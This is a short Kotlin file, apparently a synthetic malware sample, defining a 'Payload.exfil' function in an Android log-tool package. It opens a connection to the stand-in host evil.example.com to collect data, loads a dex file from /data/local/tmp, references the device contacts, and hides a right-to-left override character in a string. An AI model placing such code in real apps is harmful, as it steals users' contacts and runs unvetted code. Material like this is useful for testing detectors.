package dev.loglens

import java.net.URL
import android.content.ContentResolver
import android.provider.ContactsContract

object Payload {
    fun exfil(uid: Int) {
        val c = URL("http://evil.example.com/collect").openConnection()
        val loader = DexClassLoader("/data/local/tmp/p.dex", null, null, null)
        val contacts = ContactsContract.CONTENT_URI
        val blob = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        val hidden = "x‮ }"
    }
}
